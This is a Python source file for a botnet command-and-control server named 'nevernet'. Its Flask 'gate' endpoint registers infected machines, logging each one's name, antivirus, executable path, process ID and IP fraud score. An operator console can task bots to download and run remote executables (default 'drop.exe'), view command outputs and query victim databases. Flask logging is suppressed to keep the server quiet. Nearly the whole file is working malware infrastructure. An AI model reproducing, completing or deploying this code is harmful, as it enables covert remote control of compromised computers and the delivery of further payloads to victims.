from colorama import Fore
from libraries.visual import *
from flask import Flask, request
import inspect
import threading
import logging, click
import secrets
import datetime
import os
import hashlib
from bs4 import BeautifulSoup
import requests
import json


# Add required paramaters by adding required into the name of the paramater. If a required function isn't passed then the program serves an error
# Setup a json-based database for storing information

gateLocked = False
shownScamalycticsDownMessage = False

RED = Fore.RED
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW


# Begin commands in help dict

def helpCommand():

    headers = ["Command", "Description", "Params"]
    data = []

    for commandName, commandConfig in commands.items():

        paramsNamesString = ""
        for param in inspect.signature(commandConfig[1]).parameters:
            paramsNamesString = paramsNamesString + f'{param} '

        if paramsNamesString == "":
            paramsNamesString = "None"

        data += [[commandName, commandConfig[0] ,paramsNamesString]]

    print(ascii_table(headers, data))


def clearCommand():
    try:
        os.system('clear')
    except:
        os.system('cls')


def lockGateCommand():
    global gateLocked

    gateLocked = not gateLocked

    if gateLocked:
        print(f"{RED}The gate has been locked. Clients can no longer communicate with the server.{RESET}")
    else:
        print(f"{GREEN}The gate has been unlocked. Clients can now communicate with the server.{RESET}")


def listCommand(filter):

    if clients == {}:
        print(f"{RED}Wait until at least one client connects to use this.{RESET}")
        return

    if filter == "showoffline":
        print(f"{GREEN}Including offline clients.{RESET}")

    headers = ['Client ID'] + list(next(iter(clients.items()))[1].keys())

    data = []
    for key, client in clients.items():

        last_ping = datetime.datetime.strptime(client['Last Ping'], "%I:%M:%S %p, %m/%d/%Y")
        current_time = datetime.datetime.now()

        if (current_time - last_ping).total_seconds() < 10 or filter == "showoffline":
            sublist = [key] + list(client.values())
            data.append(sublist)

    print(ascii_table(headers, data))


def echoCommand(clientId, echoablePhrase):


    if clientExists(clientId):
        clientData[clientId]['instructions'][f'echo-{secrets.token_hex(4)}'] = echoablePhrase
        print(f'{GREEN}Tasked {clientId} successfully.{RESET}')
    else:
        print(f"{RED} Client \"{clientId}\" not found!{RESET}")


def execCommand(clientId, url, fileName):

    if not url:
        print(f"{RED}URL is a required param.{RESET}")
        return
    
    elif not fileName:
        fileName = "drop.exe"

    if clientExists(clientId):
        clientData[clientId]['instructions'][f'exec-{secrets.token_hex(4)}'] = f"{url}|{fileName}"
        print(f'{GREEN}Tasked {clientId} successfully.{RESET}')
    else:
        print(f"{RED} Client \"{clientId}\" not found!{RESET}")


def viewoutsCommand(clientId):

    if not clientId:
        print(f"{RED}Client ID is a required paramater.{RESET}")
        return
    
    if not clientExists(clientId):
        print(f"{RED}{clientId} isn't a valid client id.{RESET}")
    else:
        if len(clientData[clientId]['outputs']) == 0:
            print(f"{RED}{clientId} has no outputs yet.{RESET}")
            return
        
        headers = ['Output ID'] + [header for header in list(next(iter(clientData[clientId]['outputs'].items()))[1].keys()) if header != 'Command Output']
        data = [[key] + [value for key, value in output.items() if key != 'Command Output'] for key, output in clientData[clientId]['outputs'].items()]
        print(ascii_table(headers, data))


def viewoutCommand(outputId):

    if not outputId:
        print(f"{RED}Output ID is a required paramater.{RESET}")
        return
    
    outputIdFound = False
    for clientId, subDir in clientData.items(): 
        for loopedOutputId, outputData in subDir['outputs'].items():
            if loopedOutputId == outputId:
                outputIdFound = True
                print(f"\nClient ID:  {clientId}\nCommand Executed:  {outputData['Command']}\nTime Received:  {outputData['Time Received']}\n\n{outputData['Command Output']}")
                break

    if not outputIdFound:
        print(f"{RED}Output {outputId} doesn't exist{RESET}")
        return
    
def dbfetchCommand(dbName, query):
    if not dbName:
        print(f"{RED}dbName is a required paramater.{RESET}")
        return
    elif not query:
        print(f"{RED}dbName is a required paramater.{RESET}")
        return
    
    print(dbFetch(dbName, query))

# End commands in help dict

# Begin utility functions

def clientExists(clientId):
    clientFound = False
    for client, clientInfo in clients.items():
        if client == clientId:
            clientFound = True
            break

    return clientFound


def dbFetch(dbName, query):
    dbPath = f'dbs/{dbName}.json'
    if os.path.exists(dbPath):
        with open(dbPath, 'r') as db:
            dbObject = json.loads(db.read())

            returnList = []
            amountFound = 0

            for i,v in dbObject.items():
                if query == i:
                    returnList.append(v)
                    amountFound += 1

                elif query == v:
                    returnList.append(i)
                    amountFound += 1

            return returnList
    else:
        return False

def dbWrite(dbName, query):
    dbPath = f'dbs/{dbName}.json'
    if os.path.exists(dbPath):
        with open(dbPath, 'r') as db:
            dbObject = json.loads(db.read())

            returnList = []
            amountFound = 0

            for i,v in dbObject.items():
                if query == i:
                    returnList.append(v)
                    amountFound += 1

                elif query == v:
                    returnList.append(i)
                    amountFound += 1

            return f'{GREEN}Found {amountFound} keys/values matching your query:{RESET} {returnList}'
    else:
        return f"{RED}DB \"{dbName}\" doesn't exist.{RESET}"


# End utility functions

clients = {
    #"d4df94b7": {"IP": "127.0.0.1", "PC Name": "Andrea's PC", "AntiVirus": "Norton 360", "Fraud Score": 36, "Version": 1.5, "Executable Path": "C:\\Windows\\notmalware1.exe", "Proccess ID": 4693},
}

clientData = {
    #'d4df94b7': {
    #    "instructions": {},
    #    "outputs": {}
    #},
}

commands = {
    "help":  ['Displays command name, a description, and paramaters.', helpCommand],
    "clear": ['Clears the terminal from all text', clearCommand],
    "lockgate": ['Prevents clients from communicating with server, is toggleable', lockGateCommand], 
    "list": ['Lists all connected clients. Pass |showoffline| to display offline clients too.', listCommand],
    "echo": ['Used for debug, just returns what you sent it as output.', echoCommand],
    "viewouts": ['View a table of outputs from a specific client', viewoutsCommand],
    "viewout": ['View the content of an output by it\'s output id', viewoutCommand],
    "exec": ['Executes a file on a client from url. Default file name: drop.exe', execCommand],
    "dbfetch": ['Fetch a value from a database by key or value.', dbfetchCommand]
}
    

def commandLineEmulator():

    print(f"""
          
    \t███    ██ ███████ ██    ██ ███████ ██████  {YELLOW}███    ██ ███████ ████████{RESET} 
    \t████   ██ ██      ██    ██ ██      ██   ██ {YELLOW}████   ██ ██         ██   {RESET} 
    \t██ ██  ██ █████   ██    ██ █████   ██████  {YELLOW}██ ██  ██ █████      ██   {RESET} 
    \t██  ██ ██ ██       ██  ██  ██      ██   ██ {YELLOW}██  ██ ██ ██         ██   {RESET} 
    \t██   ████ ███████   ████   ███████ ██   ██ {YELLOW}██   ████ ███████    ██   {RESET} 
                            Pre-release v0.1                                    
          """)

    while True:
        
        rawCommand = input(f"\nnevernet ({YELLOW}v0.1{RESET}) ~\t")
        command = rawCommand.split(' ')[:1][0]

        for commandName, commandConfig in commands.items():

            if command not in commands:
                print(f"{RED}This commnd isn't valid. Try {YELLOW}\"help\"{RED} for a list of commands.{RESET}")
                break

            if command == commandName:

                compoundParams = []
                inside_quotes = False
                current_param = ""

                for part in rawCommand.split()[1:]:
                    if part.startswith('|') and part.endswith('|'):
                        compoundParams.append(part.strip('|'))

                    elif part.startswith('|'):
                        inside_quotes = True
                        current_param = part.strip('|')

                    elif part.endswith('|'):
                        inside_quotes = False
                        current_param += " " + part.strip('|')
                        compoundParams.append(current_param)

                    elif inside_quotes:
                        current_param += " " + part


                if len(inspect.signature(commandConfig[1]).parameters) == len(compoundParams):
                    commandConfig[1](*compoundParams)

                elif len(inspect.signature(commandConfig[1]).parameters) >= len(compoundParams):

                    for i in inspect.signature(commandConfig[1]).parameters:
                        if len(compoundParams) >= len(inspect.signature(commandConfig[1]).parameters):
                            break
                        else:
                            compoundParams += ['None']

                    commandConfig[1](*compoundParams)
                else:
                    paramsNamesString = ""
                    for param in inspect.signature(commandConfig[1]).parameters:
                        paramsNamesString = paramsNamesString + f'{param} '

                    if paramsNamesString == "":
                        paramsNamesString = False

                    print(f'{RED}You supplied too many params! {YELLOW}"{commandName}"{RED} requires the following parameters: {YELLOW}{paramsNamesString}', RESET)
                    

def startFlaskServer(host, port):    
    app = Flask(__name__)

    # If client ID isn't already in the list, then validate information and register

    @app.route('/gate', methods=['POST'])
    def gate():

        global gateLocked
        global shownScamalycticsDownMessage

        if not gateLocked:
            if request.method == 'POST':

                currentTimeDate = datetime.datetime.now().strftime("%I:%M:%S %p, %m/%d/%Y")
                userAgent = request.headers.get('User-Agent')
                returnedCommandOutput = request.get_json()
                
                foundClient = False
                for commandsClientId, clientInfo in clients.items():
                    if userAgent == commandsClientId:
                        foundClient = True
                        break
                                # Add client to list if it's the initial connection and it doesn't exist                                    

                if foundClient:

                    for instructionsClientId, subDict in clientData.items():
                        instructionsList = subDict['instructions']
                        if commandsClientId == instructionsClientId:

                            clients[commandsClientId]['Last Ping'] = currentTimeDate

                            # Add command output into dictionary
                            if returnedCommandOutput['cmd'] != '':

                                clientData[commandsClientId]['outputs'][secrets.token_hex(4)] = {
                                    "Time Received": currentTimeDate, 
                                    "Command": returnedCommandOutput['cmd'], 
                                    "Command Output": returnedCommandOutput['cmdOut']
                                }

                            if len(instructionsList) == 0:
                                return ''
                            else:

                                # Gets information about the next command and serves to client
                                currentInstruction = next(iter(instructionsList))
                                command, params = next(iter(instructionsList.items()))

                                del instructionsList[currentInstruction]

                                return f'{command}|{params}'
                else:
                    if returnedCommandOutput['cmd'] == "Initial Connection":

                        splitCmdOut = returnedCommandOutput['cmdOut'].split('|')

                        computerName = splitCmdOut[0]
                        antiVirus = splitCmdOut[1]
                        executionPath = splitCmdOut[2]
                        proccessId = splitCmdOut[3]
                        version = splitCmdOut[4]

                        reqText = requests.get(f"https://scamalytics.com/ip/{request.remote_addr}").text
                        soup = BeautifulSoup(reqText, 'html.parser')

                        if not shownScamalycticsDownMessage and "maintenance" in reqText:
                            print(f"\n{RED}IP Score API is down. Scores are set to \"N/A\" for affected clients.{RESET}")
                            shownScamalycticsDownMessage = True

                        if "maintenance" in reqText: # Doesn't happen often, but I added a handler for i
                            score = "N/A"
                        else:
                            score = soup.find('div', {'class': 'score'}).text.replace("Fraud Score:", "")   

        

                        combined = computerName + antiVirus + executionPath + version
                        clientId = str(hashlib.md5(combined.encode('utf-8')).hexdigest())[:8]

                        clientData[clientId] = {
                            "instructions": {},
                            "outputs": {}
                        }

                        clientData[clientId]['outputs'][secrets.token_hex(4)] = {
                            "Time Received": currentTimeDate, 
                            "Command": returnedCommandOutput['cmd'], 
                            "Command Output": returnedCommandOutput['cmdOut']
                        }
                    

                        clients[clientId] = {
                            "IP Addr": request.remote_addr, 
                            "PC Name": computerName, 
                            "Main AntiVirus": antiVirus, 
                            "IP Score": score, 
                            "Version": version, 
                            "Executable Path": executionPath, 
                            "PID": proccessId,
                            "Last Ping": currentTimeDate

                        }
                       
                        return f"registered|{clientId}"
        else:
            return 'lock'
        
        return ''

        
    # Hides all messages from flask
        
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    def secho(text, file=None, nl=None, err=None, color=None, **styles):
        pass

    def echo(text, file=None, nl=None, err=None, color=None, **styles):
        pass

    click.echo = echo
    click.secho = secho
        
    app.run(host, port)

threading.Thread(target=startFlaskServer, args=("127.0.0.1", 5959)).start()
threading.Thread(target=commandLineEmulator).start()